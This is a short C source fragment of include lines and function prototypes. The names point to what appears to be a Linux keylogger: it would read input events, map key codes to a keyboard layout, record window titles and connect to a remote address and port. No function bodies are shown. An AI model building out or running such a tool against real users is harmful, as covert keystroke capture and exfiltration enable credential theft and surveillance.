#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <unistd.h>

#define LEN 64
#define LLEN 128

void banner(void);
void handler();
char* code_to_str(char* layout, int code);
char* get_kb_symbols(void);
char* get_kb_keycodes(void);
char* get_window_title(void);
char* get_kb_layout(char *keycodes, char *symbols);
int conn(char *addr, char *port);
